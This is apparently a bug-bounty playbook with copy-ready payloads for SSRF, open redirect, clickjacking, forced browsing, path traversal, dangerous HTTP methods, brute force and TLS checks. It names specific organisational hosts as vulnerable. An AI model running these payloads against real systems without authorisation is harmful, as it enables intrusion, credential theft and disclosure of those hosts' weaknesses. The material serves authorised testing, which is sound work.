# Techniques — full reproduction payloads per class

Every payload here is the **actual format observed in a real engagement**
(111 hosts / 341 findings) or a directly derived variant. Use them as
templates, substitute the target, and verify the response before reporting.

---

## 1. Blind SSRF via CSP `report-uri` / `report-to`

**Why this class matters:** a CSP `report-uri` directive makes the **server**
POST a JSON report to the configured URL. If that URL is attacker-influenced
or the app exposes a report endpoint that fetches a supplied URL, the server
becomes an SSRF proxy. The response never comes back to you — it is **blind**,
so you need an OOB callback.

**Observed in the wild (3 hosts in the source engagement):**

```
POST /csp_report HTTP/2
Host: crs-uat.olamagri.com
Content-Type: application/csp-report

{
  "csp-report": {
    "document-uri": "https://crs-uat.olamagri.com/",
    "referrer": "",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "original-policy": "default-src 'self'; form-action 'none'; frame-ancestors 'self'; script-src 'unsafe-eval' 'unsafe-hashes' 'unsafe-inline'; report-sample ; report-uri /csp_report",
    "blocked-uri": "http://<canary-id>.oastify.com",
    "status-code": 404,
    "script-sample": ""
  }
}
```

Response: `HTTP/2 200 OK` with `Content-Length: 0`.

**The proof is the OOB callback, not the 200.** The server accepted the report
and (on a real vuln) POSTs to the `blocked-uri` you supplied. Capture the
callback log line showing the server's outbound request.

**Hunt it:**

```bash
# 1. Read the CSP of the target — does it even have a report-uri?
curl -skI "https://$TARGET/" | grep -i "content-security-policy"
# report-uri /csp_report   <- server will POST there
# report-to    {"group":"csp"}  <- also fetchable

# 2. Find the report endpoint
for p in /csp_report /csp-report /report /csp /r /api/csp; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://$TARGET$p" \
         -H "Content-Type: application/csp-report" -d '{}')
  echo "$p -> $code"
done

# 3. Fire the payload with your OOB canary
CANARY="http://$(cat /tmp/canary_id).oastify.com"
curl -sk -X POST "https://$TARGET/csp_report" \
  -H "Content-Type: application/csp-report" \
  -d "{\"csp-report\":{\"document-uri\":\"https://$TARGET/\",\"referrer\":\"\",\"violated-directive\":\"script-src-elem\",\"effective-directive\":\"script-src-elem\",\"original-policy\":\"default-src 'self'\",\"blocked-uri\":\"$CANARY\",\"status-code\":404,\"script-sample\":\"\"}}"
```

**Validation gate:** the callback log must show a request from the target's
IP to your canary. `HTTP 200` on the report endpoint alone is NOT proof — many
apps accept and discard the report.

**Escalate:** replace the canary with `http://169.254.169.254/latest/meta-data/`
(cloud metadata) and try internal IPs (`127.0.0.1`, `10.0.0.1`, `192.168.x.x`).
A metadata leak is Critical. You cannot read the response blind, but a
**timing difference** (timeout vs instant 200) or a second-order effect
(metadata cached into a page) proves it.

**Also try the non-CSP variants:**
```
GET  /?url=http://CANARY
POST /proxy  body: {"target":"http://CANARY"}
GET  /api/fetch?url=...
POST /webhook?callback=...
GET  /image?src=...   /img?url=...   /proxy?target=...
GET  /api/v1/import  (JSON body with a URL field)
```

---

## 2. Open Redirect

**Observed in the wild:** SAP NetWeaver ICF logoff endpoint.

```
GET /sap/public/bc/icf/logoff?redirecturl=https://example.com
Host: wdprise.sap.olamagri.com
```

→ `302` / `Location: https://example.com/`

This is a **known SAP pattern** — the `redirecturl` parameter on the ICF
logoff endpoint is a classic open redirect. SAP has shipped fixes (and
guidance) for it, so many deployments still carry it.

**Hunt it — application-agnostic parameter fuzz:**

```bash
EXT="https://example.com"
for p in redirecturl redirect redirect_uri redirect_uri_1 url next returnUrl \
         returnto return goto target dest destination continue view rurl \
         forward callback returl u to out ref path; do
  loc=$(curl -sk -o /dev/null -w "%{redirect_url}" \
        "https://$TARGET/?$p=$EXT")
  [ -n "$loc" ] && echo "HIT $p -> $loc"
done

# Also try the param in the PATH, not just the query
for p in /redirect /redirect/ /out /goto /login?next=; do
  loc=$(curl -sk -o /dev/null -w "%{redirect_url}" "https://$TARGET$p")
  [ -n "$loc" ] && echo "HIT $p -> $loc"
done
```

**Known-vendor endpoints to try directly:**
```
/sap/public/bc/icf/logoff?redirecturl=
/sap/bc/logout?redirecturl=
/nwa/portal/logout?redirecturl=
/oauth/logout?redirect_uri=
/logout?returnUrl=
/auth/logout?post_logout_redirect_uri=
/saml/logout?RelayState=
/cas/logout?service=
/oauth/authorize?redirect_uri=   (if it accepts a non-allowlisted value)
```

**Validation gate:** the response must be a `3xx` with `Location` pointing at
**your** domain, and the redirect must actually be followed to your host.
A `200` page that merely echoes the parameter is not an open redirect.

**Severity:** Medium. High if the parameter flows through an **auth flow** —
i.e. you can craft a link that logs the victim in as yourself, or steals a
token in the query string of the redirect target.

---

## 3. Clickjacking

**Gate:** the target must lack BOTH `X-Frame-Options` AND CSP `frame-ancestors`.

```bash
curl -skI "https://$TARGET/" | grep -iE "x-frame-options|content-security-policy"
```

**PoC (host it yourself — do not host on the target's domain):**

```html
<!DOCTYPE html>
<!-- Clickjacking PoC - authorized security testing only -->
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    body { font-family: sans-serif; margin: 0; }
    .banner { background: #c00; color: #fff; padding: 10px; font-weight: bold; }
    iframe { width: 100%; height: 90vh; border: 4px solid #c00; }
  </style>
</head>
<body>
  <div class="banner">ATTACKER-CONTROLLED PAGE - target framed below is the clickjacking PoC</div>
  <iframe src="https://TARGET/"></iframe>
</body>
</html>
```

**Validation gate:** load the PoC and confirm the target **actually renders
inside the iframe** (not `X-Frame-Options: DENY`, not a CSP refusal page). A
screenshot showing the framed content is the proof.

**Severity:** Medium. High only on a sensitive action (payment, permission
grant, settings change) where a click can be triggered over a real control.

---

## 4. Forced Browsing / IDOR (unauthenticated access to protected files)

**Observed in the wild:** 24Online Info appliance (`/24online/webpages/login.jsp`).

```bash
for p in /.git/config /.git/HEAD /.env /.DS_Store /.svn/entries /.hg/requires \
         /backup.zip /backup.tar.gz /db.sql /dump.sql /config.php.bak \
         /web.config /phpinfo.php /server-status /server-info \
         /WEB-INF/web.xml /crossdomain.xml /.aws/credentials \
         /actuator/env /actuator/heapdump /debug /trace /metrics \
         /admin /administrator /manager /phpmyadmin /swagger /docs; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  [ "$code" = "200" ] && echo "200 $p"
done
```

**Validation gate — this is where most people file garbage.** A `200` is only
a finding if the body contains **real protected content**:
- `.git/config` → contains `[core]` / `[remote "origin"]` with a real URL
- `.env` → contains `KEY=...` assignments
- `actuator/env` → contains `"propertySources"`
- `WEB-INF/web.xml` → contains `<web-app`
- a backup file → real content, not an error page

Also compare against the **authenticated** version of the same path — if the
unauthenticated response is byte-identical to the login page, it is not a
finding. Diff the bodies.

---

## 5. Known Vulnerable Components

**This is the only class in the fleet where findings genuinely are per-host.**

**Server side:**

```bash
# Version banners
curl -skI "https://$TARGET/" | grep -iE "^server:|x-powered-by|x-aspnet|x-runtime"
curl -skI "https://$TARGET/" | grep -i "x-aspnet-version"   # CVE-2002-0704 etc.

# Apache mod_jk / mod_status — the classic path traversal chain
curl -sk "https://$TARGET/mod_status"
curl -sk "https://$TARGET/mod_status?auto"
curl -sk "https://$TARGET/server-status"
```

**mod_jk path traversal (CVE-2007-6398 / the mod_jk 1.2.x/2.2.x family):**
```
/jkstatus
/mod_jk/jk2_push_status
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/..;/..;/..;/etc/passwd
/cgi-bin/..;/..;/..;/etc/passwd
```
The classic `mod_jk` traversal uses the `..;` sequence, because the servlet
container treats `;` as a path-parameter delimiter.

**Client side — read the version out of the file, never guess it:**

```bash
# Fetch and read the banner comment
curl -sk "https://$TARGET/assets/js/vendor/jquery-3.4.1.min.js" | head -3
# /*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */

# Then map to CVEs:
#   jQuery 3.4.1  -> CVE-2020-11022, CVE-2020-11023 (XSS via htmlPrefilter)
#   jQuery <3.5.0 -> CVE-2020-11022 / CVE-2020-11023
#   jQuery <3.3.1  -> CVE-2019-11358 (prototype pollution)
#   jQuery 1.x/2.x -> CVE-2015-9251 (cross-domain ajax), CVE-2020-11023
```

**Automated:**

```bash
nuclei -l targets.txt -t cves/ -t exposures/ -t vuln/ -o cves.txt -silent
nuclei -l targets.txt -t tech/ -o tech.txt -silent

# retire.js against a live bundle
npx retire --path https://$TARGET/assets/js/ --outputformat json --outputpath retire.json

# Or offline, if you mirrored the bundles
npx retire --path ./downloaded-js/ --outputformat json
```

**Validation gate:** exact library name + exact version + CVE id, with the
version **read from the artifact**. A banner like `Server: Apache/2.4.29` is a
claim, not a confirmation — verify with a real request to the specific path.

---

## 6. Swagger / OpenAPI Exposure

**Observed in the wild:**

```
https://cpuat.olamagri.com/api/api-docs/           -> Swagger UI
https://cpuat.olamagri.com/api/api-docs/swagger.json
https://kycdevapi.olammarkets.com/api-docs/         -> Swagger UI
https://kycdevapi.olammarkets.com/api-docs/swagger.yaml
```

**Hunt it:**

```bash
for p in /swagger-ui.html /swagger-ui/ /swagger/index.html \
         /api-docs /api-docs/ /api-docs/swagger.json /api-docs/swagger.yaml \
         /swagger.json /swagger.yaml /v2/api-docs /v3/api-docs \
         /openapi.json /openapi.yaml /api/swagger.json /api/swagger.yaml \
         /api/api-docs /api/api-docs/ /graphql /graphiql \
         /actuator /actuator/env; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  [ "$code" = "200" ] && echo "200 $p"
done
```

**Parse the spec and look for the interesting endpoints:**

```bash
curl -sk "https://$TARGET/v3/api-docs" | jq -r '.paths | keys[]' | \
  grep -iE 'admin|user|auth|token|internal|debug|config|secret|key|delete|'
```

**Validation gate:** the spec must be `200` AND parse AND list **real**
endpoints. Severity comes from what is in it:
- admin/auth/role-management endpoints → High
- internal-only endpoints (staging hosts, private routes) → Medium
- a list of public endpoints nobody knew about → Low/Info
- the spec documents a **mutating** endpoint with no auth requirement → test it

---

## 7. HTTP Dangerous Methods Enabled

```bash
for m in PUT DELETE TRACE PATCH PROPFIND; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X $m "https://$TARGET/")
  echo "$m -> $code"
done
```

**Validation gate:** a `200` on the root path is not enough — many servers
accept the method and ignore it. Prove the method is **actually acted on**:
- `PUT` a file, then `GET` it back and show your content
- `DELETE` a file you created, show it is gone
- `TRACE` → response body echoes the request headers (XST)

```bash
# TRACE echo proof
curl -sk -X TRACE "https://$TARGET/" | head -20

# PUT write proof
curl -sk -X PUT "https://$TARGET/$(echo $RANDOM).txt" -d "proof-of-concept" -o /dev/null -w "%{http_code}\n"
curl -sk "https://$TARGET/$(echo $RANDOM).txt"   # did it stick?
```

**Escalation:** if you can `PUT` a `.jsp`/`.php`/`.aspx` file, that is RCE —
Critical. Test on a benign filename first, then only escalate to an executable
if the program permits and you understand the containment.

---

## 8. Missing Rate Limiting

```bash
# Login brute force — use a THROWAWAY account, modest N, no real password
for i in $(seq 1 30); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/login" \
    -d "username=[REDACTED_EMAIL]&password=[REDACTED_SECRET]")
  echo -n "$code "
done
echo
```

**Validation gate:** the endpoint must be a **real** auth endpoint (respond
401/403, not 404/405). A 405 means the endpoint does not accept POST — that
proves nothing about rate limiting.

**Where it pays:**
- login → credential stuffing → **High**
- OTP / password-reset / MFA code → account takeover → **High**
- signup / invite / email-send → spam relay, phishing → **Medium**
- API key enumeration → **Medium**

**Never** hammer a production auth endpoint hard enough to lock out real users
or trip the SOC. N=30 with a throwaway account is the responsible ceiling.

---

## 9. TLS Cipher / Protocol State (the Lucky13 / BREACH class)

**This is the class that produced 147 of 341 findings in the source
engagement — and it is almost certainly ONE config bug per front end.**

```bash
# The full offered cipher list (SECLEVEL=0 so 3DES/RC4 are permitted)
openssl s_client -connect $TARGET:443 -servername $TARGET \
  -cipher 'ALL:@SECLEVEL=0' -tls1_2 </dev/null 2>&1 | grep -E "^\s*Cipher\s*:"

# Weak protocol negotiation
for p in -tls1 -tls1_1 -ssl3; do
  openssl s_client -connect $TARGET:443 -servername $TARGET $p </dev/null 2>&1 | \
    grep -E "Protocol|Cipher|alert" | head -3
done
```

**CRITICAL GOTCHA:** `openssl s_client` writes its banner to **stderr**. If
you pipe `2>/dev/null` you get an empty string and will falsely conclude
"no ciphers found". Merge the streams: `2>&1`.

**The cipher set that triggered Lucky13 + BREACH in the source engagement**
(8 suites, and note they are all CBC-mode with a SHA1 MAC):
```
ECDHE-RSA-AES128-SHA256   xc027   TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
ECDHE-RSA-AES256-SHA384   xc028   TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
ECDHE-RSA-AES128-SHA      xc013   TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
ECDHE-RSA-AES256-SHA      xc014   TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
AES128-SHA256             x3c     TLS_RSA_WITH_AES_128_CBC_SHA256
AES256-SHA256             x3d     TLS_RSA_WITH_AES_256_CBC_SHA256
AES128-SHA                 x2f     TLS_RSA_WITH_AES_128_CBC_SHA
AES256-SHA                 x35     TLS_RSA_WITH_AES_256_CBC_SHA
```
The `xc0xx` / `x3c` / `x2f` / `x35` codes are the **Hex Cipher ID** — include
them in the report, that is what a triager wants to see.

Other cipher sets seen:
```
AES256-SHA, CAMELLIA256-SHA, AES128-SHA, SEED-SHA, CAMELLIA128-SHA,
IDEA-CBC-SHA, DES-CBC3-SHA          <- 3DES + IDEA = 64-bit block ciphers
```
`DES-CBC3-SHA` / `IDEA-CBC-SHA` are the 64-bit-block family — that is the
**Sweet32 (CVE-2016-2183)** trigger, not Lucky13.

**Reality check on severity:**
- **Lucky13** (CVE-2013-0169) — CBC MAC timing leak. Needs an on-path
  attacker + many sessions. **Not remotely exploitable in a normal
  engagement.** Report cipher *support*; expect Info/Low.
- **BREACH** (CVE-2013-0169 cousin) — needs **HTTP compression enabled** AND
  CBC AND a secret in the response. Confirm compression is on
  (`Content-Encoding: gzip/br` in the response) before calling it BREACH.
  Otherwise it is Lucky13-class.
- **POODLE** — needs **SSLv3 actually negotiable**. If `-ssl3` fails, there is
  no POODLE. Most modern stacks dropped `-ssl3` support entirely.
- **SWEET32** — needs 3DES/IDEA *and* long-lived same-key traffic. Support only.
- **FREAK** (CVE-2015-0204) — needs export-grade RSA. Prove it.
- **DROWN** (CVE-2016-0800) — needs SSLv2 on *some* host sharing the cert.
  Scan the cert's SAN list.

**Never claim a decrypt you did not perform.** A report that says "CBC
ciphers are offered" is Info. A report that says "I decrypted the traffic" and
cannot show it is a fraud report.

---

## 10. Missing / Weak Security Headers, CSP, Cookie Attributes

**Header check:**

```bash
curl -skI "https://$TARGET/" | grep -iE \
  "strict-transport-security|content-security-policy|x-frame-options|x-content-type-options|referrer-policy|permissions-policy"
```

**Cookie attributes** — set a cookie and inspect the `Set-Cookie`:
```bash
curl -skI "https://$TARGET/" | grep -i "set-cookie"
# want: Secure; HttpOnly; SameSite=Lax|Strict
```

**Weak CSP indicators** (from a real target):
```
default-src 'self'; form-action 'none'; frame-ancestors 'self';
script-src 'unsafe-eval' 'unsafe-hashes' 'unsafe-inline'; report-sample ;
report-uri /csp_report
```
`unsafe-eval` + `unsafe-inline` in `script-src` = the CSP provides almost no
XSS mitigation. `report-sample` leaks the violated content into reports.

**Severity: Info.** Missing headers alone are not a vulnerability and are
frequently out of scope. They become interesting only when:
- combined with a **real** injection point (CSP that does not mitigate your XSS)
- `frame-ancestors`/`X-Frame-Options` missing on an **admin** app (clickjacking)
- `Secure` missing on a session cookie (real: cookie over plaintext is sniffable)

---

## 11. Error Page / Information Disclosure

```bash
# Default error pages leak stack traces
curl -sk "https://$TARGET/nonexistent-path-$$" | grep -iE \
  "stacktrace|exception|traceback|at java\.|at org\.|at com\.|debug mode"

# Verbose error pages
curl -sk "https://$TARGET/?debug=1" | grep -iE "stack|trace|sql|query"
```

Look for: framework stack traces, SQL fragments, internal hostnames, internal
IPs, file paths, framework versions, environment values.

**Validation gate:** the disclosure must be in the **response body**, in a
**default error page** you triggered with a random path — not in a header
you misread.

---

## OOB / Collaborator Setup

Any class needing a callback (SSRF, blind XSS, XXE out-of-band):

```bash
# interactsh (ProjectDiscovery)
interactsh-client -json
# -> yourid.oast.live  /  yourid.oast.fun

# Burp Collaborator — use the built-in server, no account needed for
# Collaborator server if you have one; otherwise use oastify:
#   https://oastify.com  -> generates <id>.oastify.com

# Quick local check (no external service)
python3 -m http.server 8000
# ... then point blocked-uri at your IP:8000 and watch the access log
```

**Always tear down the callback infrastructure after the PoC.** Never leave a
collab server running for the client, and never leave attacker-controlled
content on a target domain.
